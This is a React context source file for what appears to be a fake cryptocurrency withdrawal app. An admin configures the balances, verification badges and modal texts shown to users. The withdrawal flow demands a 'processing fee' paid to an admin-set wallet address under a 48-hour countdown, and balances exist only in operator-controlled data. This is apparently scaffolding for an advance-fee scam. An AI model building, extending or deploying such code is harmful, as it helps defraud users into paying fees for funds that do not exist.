import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import storage, { type AdminData, type UserSession, type WithdrawalTransaction } from '@/storage';

// Default admin data for initialization
const defaultAdminData: AdminData = {
  authPassword: '',
  authVerificationCode: '',
  testMode: false,
  profilePhoto: null,
  profileName: 'Crypto Trader',
  userId: '123456789',
  isVip: false,
  isVerified: false,
  cryptoBalance: 0,
  cryptoSymbol: 'BTC',
  fiatBalance: 0,
  fiatSymbol: '$',
  modalTitleTemplate: 'Processing Withdrawal of [AMOUNT]',
  modalScrollableMessage: '',
  priorityQueueTitle: 'Withdrawal Processing',
  priorityQueueDescription: 'A processing fee is required',
  networkDisplayName: 'BSC (BEP20)',
  adminWalletAddress: '',
  yellowWarningText: 'Confirm the fee amount',
  feeAmount: 0,
  countdownDuration: 172800,
  primaryButtonText: 'Continue',
  secondaryButtonText: 'Cancel',
  pendingTitle: 'Withdrawal Pending',
  pendingMessageLine1: 'Your withdrawal request has been submitted',
  pendingMessageLine2: 'Please complete the fee payment',
  pendingMessageLine3: 'Transaction ID will be generated upon confirmation',
  pendingOkButtonText: 'OK',
  adminPassword: '',
};

interface AppContextType {
  // Admin Data
  adminData: AdminData;
  updateAdminData: (data: Partial<AdminData>) => void;
  resetAdminData: () => void;

  // User Session
  userSession: UserSession;
  login: (identifier: string, stayLoggedIn: boolean) => void;
  logout: () => void;
  checkSession: () => boolean;

  // Withdrawal
  lastWithdrawal: WithdrawalTransaction | null;
  addWithdrawal: (transaction: WithdrawalTransaction) => void;
  updateBalanceAfterWithdrawal: (amount: number) => void;
  pendingWithdrawal: { amount: number; symbol: string } | null;
  setPendingWithdrawal: (withdrawal: { amount: number; symbol: string } | null) => void;

  // UI State
  toast: { message: string; type: 'success' | 'error' | 'info' } | null;
  showToast: (message: string, type?: 'success' | 'error' | 'info') => void;
  hideToast: () => void;

  // Loading
  isLoading: boolean;
  setIsLoading: (loading: boolean) => void;
}

const AppContext = createContext<AppContextType | undefined>(undefined);

export function AppProvider({ children }: { children: React.ReactNode }) {
  // Admin Data State - starts with defaults, will be fetched from database on mount
  const [adminData, setAdminData] = useState<AdminData>(defaultAdminData);

  // User Session State - read from localStorage for session persistence
  const [userSession, setUserSession] = useState<UserSession>(storage.getUserSession());

  // Withdrawal State
  const [lastWithdrawal, setLastWithdrawal] = useState<WithdrawalTransaction | null>(null);
  const [pendingWithdrawal, setPendingWithdrawal] = useState<{ amount: number; symbol: string } | null>(null);

  // UI State
  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error' | 'info' } | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  // Toast timer
  useEffect(() => {
    if (toast) {
      const timer = setTimeout(() => {
        setToast(null);
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [toast]);

  // Update admin data
  const updateAdminData = useCallback((data: Partial<AdminData>) => {
    setAdminData(prev => ({ ...prev, ...data }));
    // Admin data changes are local only (env vars are read-only)
  }, []);

  // Reset admin data
  const resetAdminData = useCallback(() => {
    setAdminData(defaultAdminData);
    // Admin data is loaded from env vars and cannot be reset
  }, []);

  // Login
  const login = useCallback((identifier: string, stayLoggedIn: boolean) => {
    const sessionExpiry = stayLoggedIn
      ? Date.now() + 5 * 24 * 60 * 60 * 1000 // 5 days
      : Date.now() + 24 * 60 * 60 * 1000; // 1 day

    const session: UserSession = {
      isLoggedIn: true,
      loginIdentifier: identifier,
      stayLoggedIn,
      sessionExpiry,
    };

    storage.setUserSession(session);
    setUserSession(session);
  }, []);

  // Logout
  const logout = useCallback(() => {
    storage.clearUserSession();
    setUserSession({ isLoggedIn: false, loginIdentifier: '', stayLoggedIn: false, sessionExpiry: null });
    setLastWithdrawal(null);
    setPendingWithdrawal(null);
  }, []);

  // Check session
  const checkSession = useCallback(() => {
    const session = storage.getUserSession();
    setUserSession(session);
    return session.isLoggedIn;
  }, []);

  // Add withdrawal
  const addWithdrawal = useCallback((transaction: WithdrawalTransaction) => {
    setLastWithdrawal(transaction);
    // Sync to localStorage
    storage.addWithdrawal(transaction);
  }, []);

  // Update balance after withdrawal
  const updateBalanceAfterWithdrawal = useCallback((amount: number) => {
    // Calculate the crypto price BEFORE deducting
    const cryptoPrice = adminData.fiatBalance / adminData.cryptoBalance;
    const newCryptoBalance = Math.max(0, adminData.cryptoBalance - amount);
    const newFiatBalance = newCryptoBalance * cryptoPrice;

    updateAdminData({
      cryptoBalance: newCryptoBalance,
      fiatBalance: newFiatBalance,
    });
  }, [adminData.cryptoBalance, adminData.fiatBalance, updateAdminData]);

  // Toast functions
  const showToast = useCallback((message: string, type: 'success' | 'error' | 'info' = 'info') => {
    setToast({ message, type });
  }, []);

  const hideToast = useCallback(() => {
    setToast(null);
  }, []);

  // Load admin data from env vars on mount
  useEffect(() => {
    const loadData = async () => {
      try {
        const envAdminData = await storage.getAdminData();
        setAdminData(envAdminData);
        const lastWithdrawal = storage.getLastWithdrawal();
        setLastWithdrawal(lastWithdrawal);
      } catch (e) {
        console.warn('Error loading admin data:', e);
      }
    };
    loadData();
    checkSession();
  }, [checkSession]);

  const value: AppContextType = {
    adminData,
    updateAdminData,
    resetAdminData,
    userSession,
    login,
    logout,
    checkSession,
    lastWithdrawal,
    addWithdrawal,
    updateBalanceAfterWithdrawal,
    pendingWithdrawal,
    setPendingWithdrawal,
    toast,
    showToast,
    hideToast,
    isLoading,
    setIsLoading,
  };

  return (
    <AppContext.Provider value={value}>
      {children}
    </AppContext.Provider>
  );
}

export function useApp() {
  const context = useContext(AppContext);
  if (context === undefined) {
    throw new Error('useApp must be used within an AppProvider');
  }
  return context;
}

export default AppContext;
